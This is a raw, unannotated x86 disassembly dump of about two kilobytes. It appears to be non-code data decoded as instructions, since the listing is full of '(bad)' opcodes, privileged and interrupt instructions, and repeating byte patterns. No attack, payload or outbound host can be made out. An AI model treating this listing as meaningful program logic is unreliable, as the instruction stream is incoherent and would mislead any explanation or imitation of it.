  413e0e:	inc    eax
  413e0f:	inc    ebx
  413e10:	bound  ax,DWORD PTR ds:0x40434100
  413e17:	add    eax,0x40054062
  413e1c:	bound  eax,QWORD PTR [ecx+0x40]
  413e1f:	inc    ebx
  413e20:	inc    eax
  413e21:	add    eax,0x25405841
  413e26:	bound  eax,QWORD PTR [eax+0x43]
  413e29:	inc    eax
  413e2a:	adc    BYTE PTR [edx+0x41],dl
  413e2d:	inc    eax
  413e2e:	test   DWORD PTR [ecx],ecx
  413e30:	push   0x44
  413e32:	sbb    al,0x34
  413e34:	enter  0x4350,0x40
  413e38:	je     0x413e0a
  413e3a:	test   DWORD PTR [edx-0x44],eax
  413e3d:	daa    
  413e3e:	nop
  413e3f:	adc    al,0x3f
  413e41:	pcmpgtw mm6,QWORD PTR [eax]
  413e44:	inc    edx
  413e45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e46:	cli    
  413e47:	inc    eax
  413e48:	sub    DWORD PTR [edx+0x9],eax
  413e4b:	push   esp
  413e4c:	test   al,0x63
  413e4e:	inc    ebx
  413e4f:	add    esi,DWORD PTR [esi-0x30]
  413e52:	sbb    BYTE PTR [eax+0x41],al
  413e55:	inc    ebx
  413e56:	inc    eax
  413e57:	add    eax,0x43406262
  413e5c:	inc    ecx
  413e5d:	adc    BYTE PTR [eax],al
  413e5f:	inc    eax
  413e60:	add    eax,0x43000562
  413e65:	add    BYTE PTR [ecx+0x40],al
  413e68:	inc    eax
  413e69:	add    eax,0x400062
  413e6e:	inc    ebx
  413e6f:	inc    eax
  413e70:	js     0x413eb3
  413e72:	inc    ecx
  413e73:	bound  eax,QWORD PTR [eax+0x62]
  413e76:	fs push esp
  413e78:	rol    DWORD PTR [eax-0x2e],1
  413e7b:	mov    ch,0x52
  413e7d:	pop    eax
  413e7e:	bound  ebp,QWORD PTR ds:0x4235156e
  413e84:	aad    0x45
  413e86:	add    BYTE PTR [ecx],bh
  413e88:	add    BYTE PTR [eax+0x43],0xdf
  413e8c:	arpl   cx,di
  413e8e:	test   al,0x68
  413e90:	pop    ebp
  413e91:	adc    dh,BYTE PTR [edx+0x73]
  413e94:	push   ebp
  413e95:	push   0x55
  413e97:	cmp    BYTE PTR [eax+eax*2],ch
  413e9a:	ins    DWORD PTR es:[edi],dx
  413e9b:	inc    edx
  413e9c:	fs fs jg 0x413f1c
  413ea0:	inc    ecx
  413ea1:	adc    al,0x24
  413ea3:	sar    edx,cl
  413ea5:	ins    DWORD PTR es:[edi],dx
  413ea6:	bound  eax,QWORD PTR [eax+0x5]
  413ea9:	inc    ecx
  413eaa:	add    BYTE PTR [ebx+0x40],al
  413ead:	inc    eax
  413eae:	inc    ecx
  413eaf:	inc    eax
  413eb0:	inc    eax
  413eb1:	bound  eax,QWORD PTR ds:0x5624300
  413eb7:	add    BYTE PTR [eax+0x40],al
  413eba:	add    BYTE PTR [ecx+0x43],al
  413ebd:	add    BYTE PTR [eax+0x41],al
  413ec0:	add    eax,0x40436200
  413ec5:	inc    eax
  413ec6:	add    eax,0x436aa862
  413ecb:	inc    eax
  413ecc:	pop    ds
  413ecd:	jbe    0x413ed8
  413ecf:	frstor [edi-0x54]
  413ed2:	xor    BYTE PTR [ebx],dl
  413ed4:	inc    eax
  413ed5:	adc    BYTE PTR [ecx],bl
  413ed7:	push   eax
  413ed8:	xchg   edx,eax
  413ed9:	ret    
  413eda:	adc    al,0x40
  413edc:	rol    DWORD PTR ds:0x5404152,1
  413ee2:	inc    eax
  413ee3:	inc    ebx
  413ee4:	bound  eax,QWORD PTR [ecx-0x7c]
  413ee7:	add    BYTE PTR ds:0x404043,ah
  413eed:	add    BYTE PTR ds:0x626210,al
  413ef3:	add    eax,0x43404140
  413ef8:	inc    eax
  413ef9:	inc    ecx
  413efa:	add    eax,0x10664062
  413eff:	inc    ebx
  413f00:	(bad)  
  413f01:	rcl    BYTE PTR [edx+0x79],1
  413f04:	inc    edi
  413f05:	push   cs
  413f06:	and    al,0x4c
  413f08:	int    0x6b
  413f0a:	mov    esp,0x7340853e
  413f0f:	nop
  413f10:	ret    
  413f11:	push   ds
  413f12:	xchg   ebp,eax
  413f13:	inc    eax
  413f14:	inc    ebx
  413f15:	or     DWORD PTR [edi],edx
  413f17:	jb     0x413e9a
  413f19:	add    eax,0x4041cc
  413f1e:	add    BYTE PTR [eax],al
  413f20:	inc    eax
  413f21:	inc    eax
  413f22:	inc    ebx
  413f23:	bound  eax,QWORD PTR [eax]
  413f25:	inc    eax
  413f26:	inc    eax
  413f27:	add    eax,0x62434162
  413f2c:	inc    eax
  413f2d:	js     0x413f3f
  413f2f:	inc    ecx
  413f30:	add    eax,0x5404325
  413f35:	bound  eax,QWORD PTR [eax+0x40]
  413f38:	inc    ecx
  413f39:	inc    ebx
  413f3a:	mov    al,0xf1
  413f3c:	mov    eax,0x405d4090
  413f41:	gs add eax,0x1f977163
  413f47:	mov    cl,0xb0
  413f49:	or     ebx,ecx
  413f4b:	pop    esp
  413f4c:	loope  0x413ef6
  413f4e:	inc    eax
  413f4f:	inc    edx
  413f50:	cmc    
  413f51:	sbb    BYTE PTR [ecx+0x3d],al
  413f54:	leave  
  413f55:	inc    eax
  413f56:	adc    al,0x11
  413f58:	rsqrtps xmm1,XMMWORD PTR [ebp-0x48]
  413f5c:	int    0x2a
  413f5e:	inc    eax
  413f5f:	inc    ebx
  413f60:	inc    eax
  413f61:	or     al,0xcc
  413f63:	add    eax,0xb3104675
  413f68:	adc    al,0xb0
  413f6a:	aaa    
  413f6b:	jnp    0x413fb9
  413f6d:	and    eax,0x436241
  413f72:	adc    BYTE PTR [eax+0x0],al
  413f75:	add    eax,0x62410040
  413f7a:	inc    eax
  413f7b:	add    BYTE PTR [ebx-0x34],al
  413f7e:	inc    eax
  413f7f:	add    eax,0x78434040
  413f84:	bound  eax,QWORD PTR [ecx+0x78]
  413f87:	add    eax,0x62404043
  413f8c:	sub    al,BYTE PTR [eax+0x5f]
  413f8f:	inc    edx
  413f90:	or     DWORD PTR [edx+eax*2+0x62],edx
  413f94:	call   0xbf6a:0x18703119
  413f9b:	rcl    DWORD PTR [esi+0x40],1
  413f9e:	outs   dx,DWORD PTR ds:[esi]
  413f9f:	inc    edx
  413fa0:	push   edx
  413fa1:	(bad)  
  413fa2:	hlt    
  413fa3:	shr    al,1
  413fa5:	adc    dl,BYTE PTR [esi+0x4164d57f]
  413fab:	bound  edi,QWORD PTR [ebp+0x40]
  413fae:	xor    eax,0x4134c272
  413fb3:	inc    eax
  413fb4:	add    eax,0x43436240
  413fb9:	add    eax,0x62004040
  413fbe:	inc    eax
  413fbf:	add    BYTE PTR [ecx+0x40],al
  413fc2:	inc    ebx
  413fc3:	test   BYTE PTR ds:0x58054041,ah
  413fc9:	inc    eax
  413fca:	inc    eax
  413fcb:	bound  eax,QWORD PTR [eax+0x66]
  413fce:	inc    ecx
  413fcf:	inc    eax
  413fd0:	add    eax,0x47470600
  413fd5:	add    eax,DWORD PTR [ebx+0x42]
  413fd8:	xchg   ecx,eax
  413fd9:	inc    eax
  413fda:	sbb    DWORD PTR [ebx+eax*2+0x6471b140],ebx
  413fe1:	lods   al,BYTE PTR ds:[esi]
  413fe2:	bound  ebx,QWORD PTR [esi+0x30]
  413fe5:	add    eax,0x3d44412d
  413fea:	jnp    0x414033
  413fec:	in     al,0x40
  413fee:	rcl    eax,cl
  413ff0:	sub    al,0xc3
  413ff2:	add    BYTE PTR [eax],al
  413ff4:	inc    ebx
  413ff5:	inc    eax
  413ff6:	bound  eax,QWORD PTR ds:0x25404110
  413ffc:	add    ah,cl
  413ffe:	inc    ebx
  413fff:	add    eax,0x40402562
  414004:	add    BYTE PTR [eax+0x40],al
  414007:	inc    ecx
  414008:	inc    ecx
  414009:	add    eax,0x78434025
  41400e:	bound  eax,QWORD PTR [eax-0x7c]
  414011:	inc    eax
  414012:	inc    ecx
  414013:	cwde   
  414014:	fld    QWORD PTR [edi+0x4]
  414017:	mov    ebx,0x6942c45b
  41401c:	test   DWORD PTR fs:[eax+0x44],eax
  414020:	push   cs
  414021:	dec    eax
  414022:	inc    ecx
  414023:	xor    al,0x40
  414025:	pusha  
  414026:	inc    eax
  414027:	xchg   ecx,eax
  414028:	inc    eax
  414029:	popf   
  41402a:	in     al,dx
  41402b:	sub    DWORD PTR [ebp+0x95d40f0],edi
  414031:	inc    esp
  414032:	inc    esi
  414033:	xchg   ebp,eax
  414034:	push   0xffffffa5
  414036:	inc    eax
  414037:	xor    eax,DWORD PTR [esi+0x2c]
  41403a:	test   al,0x11
  41403c:	mov    esi,DWORD PTR [eax+eax*2+0x41c2d028]
  414043:	inc    eax
  414044:	inc    eax
  414045:	inc    ebx
  414046:	int3   
  414047:	add    BYTE PTR ds:0x56240,al
  41404d:	inc    ebx
  41404e:	inc    eax
  41404f:	inc    eax
  414050:	add    BYTE PTR [ecx+0x62],al
  414053:	bound  eax,QWORD PTR [eax]
  414055:	int3   
  414056:	inc    eax
  414057:	inc    ebx
  414058:	add    eax,0x43624041
  41405d:	adc    BYTE PTR [ecx+0x5],al
  414060:	inc    eax
  414061:	adc    ah,al
  414063:	cmp    al,0x43
  414065:	or     al,0x51
  414067:	or     eax,0x55fbc769
  41406c:	rol    BYTE PTR [eax-0x37],cl
  41406f:	inc    eax
  414070:	xchg   ebp,eax
  414071:	sti    
  414072:	inc    esp
  414073:	nop
  414074:	fmul   QWORD PTR ds:0x624d1f31
  41407a:	test   al,0x68
  41407c:	je     0x4140be
  41407e:	inc    ecx
  41407f:	inc    eax
  414080:	sub    al,0x6e
  414082:	push   edi
  414083:	icebp  
  414084:	jnp    0x41409a
  414086:	icebp  
  414087:	rol    al,1
  414089:	int3   
  41408a:	imul   edi,DWORD PTR [eax],0xffffffda
  41408d:	inc    eax
  41408e:	jnp    0x4140e1
  414090:	sbb    DWORD PTR [edx+0x52],edx
  414093:	jne    0x4140d6
  414095:	or     BYTE PTR [edx+eiz*2],dl
  414098:	inc    ebx
  414099:	inc    eax
  41409a:	adc    BYTE PTR ds:0x4158cc40,al
  4140a0:	inc    ebx
  4140a1:	bound  eax,QWORD PTR [ecx+0x40]
  4140a4:	add    eax,0x4140
  4140a9:	and    eax,0x40400062
  4140ae:	add    eax,0x84404340
  4140b3:	int3   
  4140b4:	js     0x4140b6
  4140b6:	inc    ecx
  4140b7:	adc    BYTE PTR [edx+0xf],ah
  4140ba:	add    edx,DWORD PTR [ebp+0x43d01a75]
  4140c0:	inc    eax
  4140c1:	xor    ah,BYTE PTR [eax+0x44]
  4140c4:	int    0x34
  4140c6:	mov    al,ds:0xd0636e30
  4140cb:	sub    al,0x6a
  4140cd:	push   ss
  4140ce:	icebp  
  4140cf:	loopne 0x414111
  4140d1:	rcl    DWORD PTR [esi],1
  4140d3:	ds fs inc edx
  4140d6:	fld    DWORD PTR [edi+0xe]
  4140d9:	mov    ebp,0x5663cd2e
  4140de:	jne    0x414065
  4140e0:	inc    eax
  4140e1:	pop    esp
  4140e2:	push   eax
  4140e3:	xor    BYTE PTR ds:0xf433cc4,al
  4140e9:	pop    ecx
  4140ea:	add    eax,0x400087a6
  4140ef:	inc    ecx
  4140f0:	inc    eax
  4140f1:	inc    ebx
  4140f2:	bound  ax,DWORD PTR ds:0x40434100
  4140f9:	add    eax,0x40054062
  4140fe:	bound  eax,QWORD PTR [ecx+0x40]
  414101:	inc    ebx
  414102:	inc    eax
  414103:	add    eax,0x25405841
  414108:	bound  eax,QWORD PTR [eax+0x43]
  41410b:	inc    eax
  41410c:	adc    ah,dl
  41410e:	arpl   WORD PTR [eax+0x64484140],dx
  414114:	inc    edi
  414115:	sub    DWORD PTR [edx+0x51],eax
  414118:	or     DWORD PTR [ebx-0x30],esi
  41411b:	fs inc edx
  41411d:	mov    esp,0x42404349
  414122:	or     BYTE PTR gs:[edi],bh
  414125:	rcl    DWORD PTR [ecx+edx*8],0x14
  414129:	mov    bl,0x40
  41412b:	inc    ecx
  41412c:	inc    ebx
  41412d:	inc    eax
  41412e:	add    eax,0x43406262
  414133:	inc    ecx
  414134:	adc    BYTE PTR [eax],al
  414136:	inc    eax
  414137:	add    eax,0x43000562
  41413c:	add    BYTE PTR [ecx+0x40],al
  41413f:	inc    eax
  414140:	add    eax,0x400062
  414145:	inc    ebx
  414146:	inc    eax
  414147:	js     0x41418a
  414149:	inc    ecx
  41414a:	bound  eax,QWORD PTR [eax+0x53]
  41414d:	push   edx
  41414e:	sbb    BYTE PTR [edx],dh
  414150:	int    0x4c
  414152:	inc    eax
  414153:	pop    ecx
  414154:	push   eax
  414155:	cmp    al,0xcc
  414157:	stos   DWORD PTR es:[edi],eax
  414158:	push   eax
  414159:	adc    al,BYTE PTR [ebx]
  41415b:	xor    eax,0xb099c515
  414160:	or     eax,0x715d406b
  414165:	pusha  
  414166:	test   al,0x9d
  414168:	retf   
  414169:	mov    ss,WORD PTR ds:0x11fe5217
  41416f:	call   DWORD PTR [eax]
  414171:	inc    ecx
  414172:	inc    eax
  414173:	ins    BYTE PTR es:[edi],dx
  414174:	bound  eax,QWORD PTR [eax+0x5]
  414177:	inc    ecx
  414178:	add    BYTE PTR [ebx+0x40],al
  41417b:	inc    eax
  41417c:	inc    ecx
  41417d:	inc    eax
  41417e:	inc    eax
  41417f:	bound  eax,QWORD PTR ds:0x5624300
  414185:	add    BYTE PTR [eax+0x40],al
  414188:	add    BYTE PTR [ecx+0x43],al
  41418b:	add    BYTE PTR [eax+0x41],al
  41418e:	add    eax,0x40436200
  414193:	inc    eax
  414194:	add    eax,0xb8655162
  414199:	inc    edi
  41419a:	push   esp
  41419b:	inc    ebx
  41419c:	adc    bh,BYTE PTR [ecx-0x1f]
  41419f:	or     DWORD PTR [ecx-0x44],eax
  4141a2:	add    eax,0xb3264030
  4141a7:	sbb    BYTE PTR [esi+0x14dccb6a],dh
  4141ad:	xor    DWORD PTR [edx+0x52],eax
  4141b0:	inc    ecx
  4141b1:	inc    eax
  4141b2:	add    eax,0x41624340
  4141b7:	test   BYTE PTR [eax],al
  4141b9:	and    eax,0x404043
  4141be:	add    BYTE PTR ds:0x626210,al
  4141c4:	add    eax,0x43404140
  4141c9:	inc    eax
  4141ca:	inc    ecx
  4141cb:	add    eax,0x10664062
  4141d0:	inc    ebx
  4141d1:	(bad)  
  4141d2:	shl    ah,0x5f
  4141d5:	inc    edi
  4141d6:	inc    eax
  4141d7:	daa    
  4141d8:	jne    0x4141af
  4141da:	retf   
  4141db:	jl     0x414226
  4141dd:	test   DWORD PTR [ebx],edx
  4141df:	bnd jnp 0x4141ef
  4141e2:	mov    ah,0x62
  4141e4:	adc    DWORD PTR [ebx+0x40],eax
  4141e7:	mov    edi,0x7f31f5f5
  4141ec:	mov    BYTE PTR [eax+0x634da90e],dl
  4141f2:	imul   eax,DWORD PTR ds:0x4041cc,0x0
  4141f9:	add    BYTE PTR [eax+0x40],al
  4141fc:	inc    ebx
  4141fd:	bound  eax,QWORD PTR [eax]
  4141ff:	inc    eax
  414200:	inc    eax
  414201:	add    eax,0x62434162
  414206:	inc    eax
  414207:	js     0x414219
  414209:	inc    ecx
  41420a:	add    eax,0x5404325
  41420f:	bound  eax,QWORD PTR [eax+0x40]
  414212:	inc    ecx
  414213:	inc    ebx
  414214:	fsub   QWORD PTR [ebx+0x6e]
  414217:	inc    eax
  414218:	inc    ebx
  414219:	push   ebx
  41421a:	clc    
  41421b:	ins    BYTE PTR es:[edi],dx
  41421c:	inc    eax
  41421d:	gs inc ebx
  41421f:	or     DWORD PTR [eax],edx
  414221:	dec    ecx
  414222:	push   edx
  414223:	sub    DWORD PTR [esp+edi*2-0x2f],ecx
  414227:	inc    eax
  414228:	xor    edx,DWORD PTR [ebx-0x3297e4c8]
  41422e:	sbb    BYTE PTR [edi],bl
  414230:	pop    ecx
  414231:	sbb    ch,cl
  414233:	ror    BYTE PTR [ecx+ebx*1+0x5d],0x40
  414238:	xchg   ecx,eax
  414239:	xchg   ebp,eax
  41423a:	data16 loope 0x414271
  41423d:	nop
  41423e:	repnz adc al,0x6b
  414241:	aas    
  414242:	imul   BYTE PTR [eax+0x7]
  414245:	adc    DWORD PTR [eax],edx
  414247:	inc    eax
  414248:	xchg   ecx,eax
  414249:	and    eax,0x436241
  41424e:	adc    BYTE PTR [eax+0x0],al
  414251:	add    eax,0x62410040
  414256:	inc    eax
  414257:	add    BYTE PTR [ebx-0x34],al
  41425a:	inc    eax
  41425b:	add    eax,0x78434040
  414260:	bound  eax,QWORD PTR [ecx+0x78]
  414263:	add    eax,0x62404043
  414268:	pop    esp
  414269:	stc    
  41426a:	icebp  
  41426b:	les    eax,FWORD PTR [eax+0x41]
  41426e:	adc    BYTE PTR [ecx+0x31],dh
  414271:	or     DWORD PTR [edx+eiz*2+0x7140433d],esi
  414278:	das    
  414279:	sbb    DWORD PTR [edx+0x43],ebp
  41427c:	imul   esi,DWORD PTR [eax],0x19
  41427f:	cs xchg ecx,eax
  414281:	push   edx
  414282:	inc    ebp
  414283:	and    BYTE PTR [eax],dl
  414285:	fadd   DWORD PTR [eax+0x51]
  414288:	inc    ecx
  414289:	lds    esp,FWORD PTR [edi+eiz*4-0x20]
  41428d:	inc    edi
  41428e:	adc    cl,BYTE PTR [edx+0x41]
  414291:	inc    eax
  414292:	add    eax,0x43436240
  414297:	add    eax,0x62004040
  41429c:	inc    eax
  41429d:	add    BYTE PTR [ecx+0x40],al
  4142a0:	inc    ebx
  4142a1:	test   BYTE PTR ds:0x58054041,ah
  4142a7:	inc    eax
  4142a8:	inc    eax
  4142a9:	bound  eax,QWORD PTR [eax+0x66]
  4142ac:	inc    ecx
  4142ad:	inc    eax
  4142ae:	add    eax,0x80609100
  4142b3:	stos   DWORD PTR es:[edi],eax
  4142b4:	push   edx
  4142b5:	test   DWORD PTR [eax+0x11],eax
  4142b8:	add    ecx,ebx
  4142ba:	cmp    BYTE PTR [eax+eax*2-0x2ce0fcbd],0x65
  4142c2:	push   ss
  4142c3:	adc    al,0x3c
  4142c5:	nop
  4142c6:	inc    eax
  4142c7:	pop    ds
  4142c8:	ret    0x3409
  4142cb:	scas   eax,DWORD PTR es:[edi]
  4142cc:	jp     0x4142d9
  4142ce:	add    eax,0x801815b2
  4142d3:	bound  ebx,QWORD PTR [edi]
  4142d5:	test   al,0x0
  4142d7:	add    BYTE PTR [ebx+0x40],al
  4142da:	bound  eax,QWORD PTR ds:0x25404110
  4142e0:	add    ah,cl
  4142e2:	inc    ebx
  4142e3:	add    eax,0x40402562
  4142e8:	add    BYTE PTR [eax+0x40],al
  4142eb:	inc    ecx
  4142ec:	inc    ecx
  4142ed:	add    eax,0x78434025
  4142f2:	bound  eax,QWORD PTR [eax-0x7c]
  4142f5:	inc    eax
  4142f6:	inc    ecx
  4142f7:	inc    eax
  4142f8:	movntq QWORD PTR [edx-0x3b],mm2
  4142fc:	push   esi
  4142fd:	push   esp
  4142fe:	inc    eax
  4142ff:	add    al,0x40
  414301:	hlt    
  414302:	aad    0x41
  414304:	and    al,0x52
  414306:	sub    al,BYTE PTR [eax+0x55]
  414309:	and    al,0x60
  41430b:	push   edx
  41430c:	push   edx
  41430d:	inc    eax
  41430e:	dec    eax
  41430f:	inc    ecx
  414310:	inc    eax
  414311:	inc    eax
  414312:	inc    ebx
  414313:	int3   
  414314:	add    BYTE PTR ds:0x56240,al
  41431a:	inc    ebx
  41431b:	inc    eax
  41431c:	inc    eax
  41431d:	add    BYTE PTR [ecx+0x62],al
  414320:	bound  eax,QWORD PTR [eax]
  414322:	int3   
  414323:	inc    eax
  414324:	inc    ebx
  414325:	add    eax,0x43624041
  41432a:	adc    BYTE PTR [ecx+0x5],al
  41432d:	inc    eax
  41432e:	inc    eax
  41432f:	jne    0x41437c
  414331:	int    0xc0
  414333:	dec    ebx
  414334:	cmp    al,0x2a
  414336:	inc    eax
  414337:	aas    
  414338:	xor    DWORD PTR [ebp-0x4b],esp
  41433b:	xor    al,0x6d
  41433d:	cmp    dl,BYTE PTR [esi*2-0x6d6ff643]
  414344:	lods   al,BYTE PTR ds:[esi]
  414345:	dec    edx
  414346:	inc    eax
  414347:	aas    
  414348:	dec    edx
  414349:	sbb    BYTE PTR [eax+0x1844cbc5],ch
  41434f:	jne    0x4143a3
  414351:	push   edx
  414352:	adc    DWORD PTR [edx+0x43],esp
  414355:	inc    eax
  414356:	adc    BYTE PTR ds:0x4158cc40,al
  41435c:	inc    ebx
  41435d:	bound  eax,QWORD PTR [ecx+0x40]
  414360:	add    eax,0x4140
  414365:	and    eax,0x40400062
  41436a:	add    eax,0x84404340
  41436f:	int3   
  414370:	js     0x414372
  414372:	inc    ecx
  414373:	adc    BYTE PTR [edx+0xf],ah
  414376:	add    DWORD PTR ds:0x293f405b,edx
  41437c:	int    0xb4
  41437e:	push   esp
  41437f:	pop    edx
  414380:	inc    edi
  414381:	adc    al,0x75
  414383:	dec    esi
  414384:	pusha  
  414385:	or     eax,0x404387f7
  41438a:	aas    
  41438b:	rol    ecx,cl
  41438d:	int    0x4f
  41438f:	push   eax
  414390:	xor    BYTE PTR [esi+0x75],ch
  414393:	ins    BYTE PTR es:[edi],dx
  414394:	gs inc esp
  414396:	dec    eax
  414397:	test   BYTE PTR [eax],dl
  414399:	inc    eax
  41439a:	aas    
  41439b:	cmp    ecx,DWORD PTR [ecx]
  41439d:	pop    ds
  41439e:	or     eax,0xff0e47c3
  4143a3:	add    BYTE PTR [eax+0x41],al
  4143a6:	inc    eax
  4143a7:	inc    ebx
  4143a8:	bound  ax,DWORD PTR ds:0x40434100
  4143af:	add    eax,0x40054062
  4143b4:	bound  eax,QWORD PTR [ecx+0x40]
  4143b7:	inc    ebx
  4143b8:	inc    eax
  4143b9:	add    eax,0x25405841
  4143be:	bound  eax,QWORD PTR [eax+0x43]
  4143c1:	inc    eax
  4143c2:	adc    BYTE PTR [esi+0x18],ch
  4143c5:	test   BYTE PTR [edi-0x6d],al
  4143c8:	test   DWORD PTR [eax+0x2a],eax
  4143cb:	jne    0x41441f
  4143cd:	sub    eax,0xf43d342
  4143d2:	mov    edi,0x3c60073b
  4143d7:	bound  edx,QWORD PTR [eax-0x4bac1dc0]
  4143dd:	bound  ebx,QWORD PTR [ecx-0x58]
  4143e0:	sub    BYTE PTR [ecx],cl
  4143e2:	bound  eax,QWORD PTR [ebx-0x41]
  4143e5:	add    eax,0x40437345
  4143ea:	xor    esi,ecx
  4143ec:	mov    edi,0xd1bdddcb
  4143f1:	inc    eax
  4143f2:	inc    ecx
  4143f3:	inc    ebx
  4143f4:	inc    eax
  4143f5:	add    eax,0x43406262
  4143fa:	inc    ecx
  4143fb:	adc    BYTE PTR [eax],al
  4143fd:	inc    eax
  4143fe:	add    eax,0x43000562
  414403:	add    BYTE PTR [ecx+0x40],al
  414406:	inc    eax
  414407:	add    eax,0x400062
  41440c:	inc    ebx
  41440d:	inc    eax
  41440e:	js     0x414451
  414410:	inc    ecx
  414411:	bound  eax,QWORD PTR [eax+0x14]
  414414:	jns    0x414490
  414416:	mov    esi,0x4a44f746
  41441b:	inc    eax
  41441c:	and    esi,ecx
  41441e:	cs ss cmp al,0x2a
  414422:	and    al,0x3
  414424:	ins    BYTE PTR es:[edi],dx
  414425:	call   ebp
  414427:	mov    ebx,0x40811066
  41442c:	and    BYTE PTR [bp+si+0x42],al
  414430:	bound  edx,QWORD PTR [eax+0x62]
  414433:	inc    eax
  414434:	add    eax,0x40430041
  414439:	inc    eax
  41443a:	inc    ecx
  41443b:	inc    eax
  41443c:	inc    eax
  41443d:	bound  eax,QWORD PTR ds:0x5624300
  414443:	add    BYTE PTR [eax+0x40],al
  414446:	add    BYTE PTR [ecx+0x43],al
  414449:	add    BYTE PTR [eax+0x41],al
  41444c:	add    eax,0x40436200
  414451:	inc    eax
  414452:	add    eax,0x1215a062
  414457:	mov    al,0x60
  414459:	rol    al,1
  41445b:	add    eax,0x22654041
  414460:	sub    BYTE PTR [ebx+edx*2-0x33],dl
  414464:	inc    ebx
  414465:	adc    ch,BYTE PTR [edx]
  414467:	pop    esi
  414468:	gs inc edx
  41446a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41446b:	inc    ebx
  41446c:	xor    BYTE PTR [eax+0x61],al
  41446f:	adc    cl,BYTE PTR [ecx]
  414471:	rcr    DWORD PTR [edx+0x7d140c38],1
  414477:	pusha  
  414478:	sbb    BYTE PTR [edi+0x40473c25],al
  41447e:	push   0xa8425215
  414483:	test   DWORD PTR fs:[ebx],edx
  414486:	lahf   
  414487:	inc    ecx
  414488:	inc    eax
  414489:	add    eax,0x41624340
  41448e:	test   BYTE PTR [eax],al
  414490:	and    eax,0x404043
  414495:	add    BYTE PTR ds:0x626210,al
  41449b:	add    eax,0x43404140
  4144a0:	inc    eax
  4144a1:	inc    ecx
  4144a2:	add    eax,0x10664062
  4144a7:	inc    ebx
  4144a8:	(bad)  
  4144a9:	xlat   BYTE PTR ds:[ebx]
  4144aa:	pop    esp
  4144ab:	shr    DWORD PTR [ebx+0x2d40435d],1
  4144b1:	xor    ah,BYTE PTR [ebp+ebp*1+0xe90f030]
  4144b8:	inc    esp
  4144b9:	push   edx
  4144ba:	inc    eax
  4144bb:	and    BYTE PTR [edx+0x6040c574],cl
  4144c1:	xor    eax,DWORD PTR [eax-0x6e]
  4144c4:	add    eax,0x4041cc
  4144c9:	add    BYTE PTR [eax],al
  4144cb:	inc    eax
  4144cc:	inc    eax
  4144cd:	inc    ebx
  4144ce:	bound  eax,QWORD PTR [eax]
  4144d0:	inc    eax
  4144d1:	inc    eax
  4144d2:	add    eax,0x62434162
  4144d7:	inc    eax
  4144d8:	js     0x4144ea
  4144da:	inc    ecx
  4144db:	add    eax,0x5404325
  4144e0:	bound  eax,QWORD PTR [eax+0x40]
  4144e3:	inc    ecx
  4144e4:	inc    ebx
  4144e5:	pop    ebp
  4144e6:	cwde   
  4144e7:	inc    edi
  4144e8:	or     DWORD PTR [ebx],eax
  4144ea:	push   cs
  4144eb:	dec    eax
  4144ec:	push   0xffffff9b
  4144ee:	lds    eax,FWORD PTR [bx+si+0x29]
  4144f2:	aad    0x0
  4144f4:	and    eax,0x1f466928
  4144f9:	mov    ecx,0x894c41ed
  4144fe:	cld    
  4144ff:	push   esi
  414500:	and    eax,0x436241
  414505:	adc    BYTE PTR [eax+0x0],al
  414508:	add    eax,0x62410040
  41450d:	inc    eax
  41450e:	add    BYTE PTR [ebx-0x34],al
  414511:	inc    eax
  414512:	add    eax,0x78434040
  414517:	bound  eax,QWORD PTR [ecx+0x78]
  41451a:	add    eax,0x62404043
  41451f:	inc    eax
  414520:	sub    DWORD PTR [ecx-0x2c],edi
  414523:	jg     0x4144ea
  414525:	aad    0xd2
  414527:	adc    al,0xbf
  414529:	mov    ebx,0x38483dbc
  41452e:	scas   eax,DWORD PTR es:[edi]
  41452f:	inc    eax
  414530:	pop    ss
  414531:	inc    edx
  414532:	ss push 0xfffffffe
  414535:	leave  
  414536:	inc    ecx
  414537:	adc    BYTE PTR ds:0x4f9c90d1,bh
  41453d:	dec    esp
  41453e:	inc    ebx
  41453f:	inc    eax
  414540:	adc    DWORD PTR [ecx+0x52],edx
  414543:	test   al,0xbc
  414545:	add    eax,0x92eb1930
  41454a:	pop    ebp
  41454b:	imul   eax,DWORD PTR ds:0xe24008cb,0x43c7a822
  414555:	push   eax
  414556:	inc    ecx
  414557:	inc    eax
  414558:	add    eax,0x43436240
  41455d:	add    eax,0x62004040
  414562:	inc    eax
  414563:	add    BYTE PTR [ecx+0x40],al
  414566:	inc    ebx
  414567:	test   BYTE PTR ds:0x58054041,ah
  41456d:	inc    eax
  41456e:	inc    eax
  41456f:	bound  eax,QWORD PTR [eax+0x66]
  414572:	inc    ecx
  414573:	inc    eax
  414574:	add    eax,0xe4124700
  414579:	data16 and BYTE PTR [edx+0x48],0x15
  41457e:	test   DWORD PTR [eax+0x1f],eax
  414581:	push   ebx
  414582:	stos   DWORD PTR es:[edi],eax
  414583:	dec    edx
  414584:	add    eax,0x32034343
  414589:	adc    DWORD PTR [ecx+0x20],eax
  41458c:	retf   
  41458d:	push   ecx
  41458e:	nop
  41458f:	inc    eax
  414590:	jle    0x41452b
  414592:	inc    ecx
  414593:	jno    0x4145ed
  414595:	retf   
  414596:	add    BYTE PTR [eax],al
  414598:	inc    ebx
  414599:	inc    eax
  41459a:	bound  eax,QWORD PTR ds:0x25404110
  4145a0:	add    ah,cl
  4145a2:	inc    ebx
  4145a3:	add    eax,0x40402562
  4145a8:	add    BYTE PTR [eax+0x40],al
  4145ab:	inc    ecx
  4145ac:	inc    ecx
  4145ad:	add    eax,0x78434025
  4145b2:	bound  eax,QWORD PTR [eax-0x7c]
  4145b5:	inc    eax
  4145b6:	inc    ecx
  4145b7:	loop   0x4145be
  4145b9:	arpl   WORD PTR [edx-0x40],ax
  4145bc:	outs   dx,DWORD PTR ds:[esi]
  4145bd:	dec    ecx
  4145be:	dec    esp
  4145bf:	jb     0x414601
  4145c1:	in     al,dx
  4145c2:	icebp  
  4145c3:	sbb    al,0x9d
  4145c5:	push   ebx
  4145c6:	inc    edi
  4145c7:	cmc    
  4145c8:	add    al,0xe3
  4145ca:	push   esi
  4145cb:	xor    al,0x64
  4145cd:	aam    0x4
  4145cf:	mov    ds:0x62714540,eax
  4145d4:	leave  
  4145d5:	dec    edi
  4145d6:	pusha  
  4145d7:	rol    DWORD PTR [eax-0x5f],0xaf
  4145db:	inc    edi
  4145dc:	mov    eax,0x4050629c
  4145e1:	dec    edi
  4145e2:	inc    ecx
  4145e3:	inc    eax
  4145e4:	inc    eax
  4145e5:	inc    ebx
  4145e6:	int3   
  4145e7:	add    BYTE PTR ds:0x56240,al
  4145ed:	inc    ebx
